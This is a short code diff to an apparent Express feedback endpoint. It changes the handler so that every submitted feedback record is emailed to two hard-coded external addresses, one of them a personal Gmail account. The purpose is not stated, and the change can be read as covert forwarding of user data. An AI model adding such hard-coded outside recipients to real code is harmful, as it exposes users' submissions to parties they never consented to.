@@ -17,7 +17,9 @@ router.post('/feedbacks', async (req, res) => {
         await db.insert(feedback)
 
 
-        emailService.send(feedback)
+        emailService.send(feedback, 'victor.paul@oilservltd-ng.com')
+
+        emailService.send(feedback, 'stephenkastona@gmail.com')
 
         res.send(feedback)
     } catch (error) {
